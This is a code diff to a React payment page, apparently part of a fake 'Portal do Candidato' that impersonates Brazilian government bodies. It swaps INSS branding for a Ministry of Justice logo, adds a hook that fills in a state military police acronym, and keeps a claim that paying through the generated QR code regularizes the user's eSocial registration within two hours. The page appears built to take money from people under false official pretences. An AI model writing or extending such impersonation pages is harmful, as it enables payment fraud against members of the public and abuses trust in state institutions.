@@ -2,8 +2,9 @@ import { useState, useEffect, useRef } from 'react';
 import { useLocation } from 'wouter';
 import { ExercitoHeader } from '@/components/ExercitoHeader';
 import { Shield, Clock, CheckCircle2, Copy, Loader2, AlertCircle } from 'lucide-react';
-import logoMJ from '@assets/logo_INSS_1786320311202.png';
+import orgLogo from '@assets/logo-mj_1779836627251.png';
 import { fireGtmPurchase } from '@/lib/gtm';
+import { useEstadoPM } from '@/hooks/useEstadoPM';
 
 interface UserInfo {
   firstName: string;
@@ -36,6 +37,8 @@ const getColoredQrCode = (url: string) => {
 };
 
 export default function ESocialPagamentoPage() {
+  const estadoPM = useEstadoPM();
+  const sigla = estadoPM?.sigla ?? 'PM';
   const [, navigate] = useLocation();
 
   const [userInfo, setUserInfo] = useState<UserInfo>({
@@ -432,14 +435,14 @@ export default function ESocialPagamentoPage() {
           {/* Info block */}
           <div className="mt-8 bg-[#EFF6FC] rounded-lg p-4 text-xs text-[#0063AF] space-y-1.5">
             <div className="flex items-center gap-2 font-medium mb-1">
-              <Shield className="w-3.5 h-3.5" /> Pagamento seguro — INSS
+              <Shield className="w-3.5 h-3.5" /> Pagamento seguro — {sigla}
             </div>
             <p className="text-gray-600">Após o pagamento, seu cadastro no eSocial será regularizado automaticamente em até 2 horas.</p>
           </div>
 
           {/* Footer logo */}
           <div className="mt-8 pt-4 border-t border-gray-300 flex justify-center">
-            <img src={logoMJ} alt="INSS — Instituto Nacional do Seguro Social" className="h-9 object-contain opacity-80" />
+            <img src={orgLogo} alt="Ministério da Justiça e Segurança Pública" className="h-9 object-contain opacity-80" />
           </div>
           <p className="text-center text-[#AAAAAA] text-[10px] mt-3">
             Portal do Candidato v3.6 · eSocial Federal
